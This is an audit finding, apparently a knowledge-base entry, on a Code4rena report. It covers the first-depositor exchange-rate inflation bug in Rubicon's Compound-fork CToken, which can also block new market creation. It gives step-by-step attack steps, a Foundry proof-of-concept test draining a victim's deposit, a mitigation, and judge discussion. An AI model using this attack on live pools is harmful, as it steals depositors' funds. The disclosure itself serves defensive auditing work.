---
tags:
  - lang/solidity
  - sector/dex
  - sector/governance
  - sector/lending
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
  - impact/mev/frontrun
  - trigger/first-deposit
protocol: "[[Rubicon]]"
auditors:
  - "[[fs0c]]"
report: "https://code4rena.com/reports/2023-04-rubicon"
genome:
  - "[[rounding-direction]]"
  - "[[direct-drain]]"
  - "[[frontrun]]"
  - "[[first-deposit]]"
  - "[[frontrun-exposure]]"
---
# [H-17] First depositor bug on unmodified Compound fork

- id: 48956
- impact: HIGH
- protocol: [[Rubicon]]
- reporter: fs0c (Code4rena)
- source: https://code4rena.com/reports/2023-04-rubicon

## Summary


The CToken implementation has a bug that allows attackers to manipulate the exchange rate and steal funds from users who deposit into the CToken. This bug also affects the BathHouse contract, which will become unusable if any CToken market is attacked. The bug can be exploited by creating a new CToken with a total supply of zero and then transferring the underlying asset directly to the CToken, inflating its exchange rate. When another user deposits into the CToken, they will receive fewer tokens than expected, allowing the attacker to steal a larger share of the pool. This bug can result in direct theft of user funds and prevent the protocol from launching new markets. A fix has been proposed, which involves forcing a minimum amount of CTokens to be minted to prevent the attack. The impact of this bug is high, as it can result in fund loss and make the BathHouse contract unusable. It also affects other contracts by preventing the creation of new markets with the same underlying asset. 

## Details



The `CToken` implementation has the well-known first depositor bug that allows an attacker to manipulate the exchange rate of a `CToken`, allowing them to steal funds from depositing users.

Furthermore, due to the way the current `BathHouse` is implemented, not allowing an admin to create multiple markets for one underlying (see below code snippet), the entire `BathHouse` will be bricked as soon as any `CToken` market is attacked.

```solidity
function createBathToken(
    address underlying,
    InterestRateModel interestRateModel,
    uint256 initialExchangeRateMantissa,
    address implementation,
    bytes memory becomeImplementationData
) external onlyAdmin {
    // underlying can be used only for one bathToken
    require(
        tokenToBathToken[underlying] == address(0),
        "createBathToken: BATHTOKEN WITH THIS ERC20 EXIST ALDREADY"
    ); 
    // ...   
}
```

### The first-deposit front-running attack

An attack can happen as follow:

0. A `CToken` contract is created. The `CToken` total supply is '0', and no deposits have been made.
1. Alice the attacker mints a single `CToken` using her own funds.
2. Alice directly does a ERC20 transfer of the underlying to the `CToken` contract itself, inflating the exchange rate of the `CToken`.
3. Bob the user deposits some amount of underlying to mint `CTokens`.
    - Bob receives much less `CTokens` than he should have, due to exchange rate being inflated.
4. Alice now has a much larger share of the pool than what she should have gotten.

Since it is intended that the `BathTokens` are created by an admin through the contract `BathHouseV2.sol` by calling `createBathToken()`, an adversary can perform the front-running attack as soon as a `BathToken` is deployed. 

It has been shown in the above section that **a new market cannot be created on the same underlying**, if such an attack were to happen.

There are several impacts that such an attack can have:
- Direct theft of users' deposits.
- Direct theft of migrated V2 funds, if the user uses a `V2Migrator` set with a manipulated market.
- Redeployment of `BathHouse` by creating unrecoverable scenarios.
- Preventing the protocol from launching new markets, as any newly launched market can be sniped to attack.

We believe this is high risk, as this will result in possible fund loss, will brick the deployed `BathHouse` contract, as well as loss of safety in supporting new assets.

### Proof of concept

Use the following test case on `ProtocolDeployment.t.sol` for a demonstration of the front-running attack.

```solidity
function test_bug_firstDepositAttack() public {
  address alice = address(0xA11CE);
  address bob = address(0xB0B);

  // deal out tokens first
  vm.startPrank(TEST.admin());
  TEST.adminMint();
  TEST.transfer(alice, 200e18);
  TEST.transfer(bob, 100e18);
  vm.stopPrank();

  // initial config
  assertEq(bathTEST.exchangeRateStored(), 2e26);
  assertEq(bathTEST.totalSupply(), 0);
  assertEq(bathTEST.balanceOf(alice), 0);

  // mint tokens
  vm.prank(alice);
  TEST.approve(address(bathTEST), type(uint256).max);
  vm.prank(alice);
  bathTEST.mint(2e8);
  assertEq(bathTEST.balanceOf(alice), 1);
  assertEq(bathTEST.totalSupply(), 1);

  // alice front-running attack
  vm.prank(alice);
  TEST.transfer(address(bathTEST), 100e18);
  assertEq(bathTEST.getCash(), 100e18 + 2e8);

  // bob now deposits
  vm.prank(bob);
  TEST.approve(address(bathTEST), type(uint256).max);
  vm.prank(bob);
  bathTEST.mint(100e18);
  assertEq(bathTEST.balanceOf(bob), 0); // attacked! bob should've gotten some bathTokens
  assertEq(bathTEST.totalSupply(), 1);

  // alice redeems and gets everything
  vm.prank(alice);
  bathTEST.redeem(1);
  assertEq(TEST.balanceOf(alice), 300e18); // alice stole 100e18 from Bob
  assertEq(bathTEST.totalSupply(), 0);
}
```

### Recommended mitigation steps

The attack can happen when the `CToken` total supply is '0' or very low. The fix is to force-mint a minimum amount of `CTokens` that cannot be burned to either governance/admin, address(0), or perform such when the first mint happens.

A fix is demonstrated below, on the function `mintFresh` in contract `CToken`. This is also how Uniswap V2 prevents the same attack.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/compound-v2-fork/CToken.sol#L398-L449

```solidity
function mintFresh(address minter, uint mintAmount) internal {
    // ...
    Exp memory exchangeRate = Exp({mantissa: exchangeRateStoredInternal()});

    uint actualMintAmount = doTransferIn(minter, mintAmount);

    uint mintTokens = div_(actualMintAmount, exchangeRate);

    // fix starts
    if (totalSupply == 0) {
        totalSupply = 1000;
        accountTokens[address(0)] = 1000;
        mintTokens -= 1000;
    }
    // fix ends

    totalSupply = totalSupply + mintTokens;
    accountTokens[minter] = accountTokens[minter] + mintTokens;
    // ...
}
```

**[daoio (Rubicon) acknowledged via duplicate issue #1156](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1156#issuecomment-1547285860)**

**[neko_nyaa (warden) commented via duplicate issue #1156](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1156#issuecomment-1588254944):**
>Would do like the judge and sponsor to reconsider the impacts of this finding.
>
>The `CToken` is meant to be deployed from `BathHouse` using the following admin-only function, which is in-scope.
>
>```solidity
>function createBathToken(
>    address underlying,
>    InterestRateModel interestRateModel,
>    uint256 initialExchangeRateMantissa,
>    address implementation,
>    bytes memory becomeImplementationData
>) external onlyAdmin {
>    // ...
>    require(
>        tokenToBathToken[underlying] == address(0),
>        "createBathToken: BATHTOKEN WITH THIS ERC20 EXIST ALDREADY"
>    ); 
>    // ...   
>}
>```
>
>As shown on this function, only one `BathToken` can be created per ERC20 token. Thus, the impact of this attack is not only a redeployment, but it also directly affects in-scope contracts by bricking said market, since the market actually cannot be redeployed.
>
>Therefore the bug directly affects in-scope contracts, and can be seen as erroneous integration of code forks.
>
>This is also mentioned in the [#143](https://github.com/code-423n4/2023-04-rubicon-findings/issues/143) report. I believe none of the other reports mentioned this.

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/143#issuecomment-1588435508):**
 > Report was initially redacted, added in the content.
> 
> One detail that all other dups failed to mention was the bricking of re-creation of markets with the same underlying (other than from lost assets), which was what brought this bug in-scope. It is of course possible to do an entire re-deployment, but that would require re-deployments of all existing prior markets as well.

***
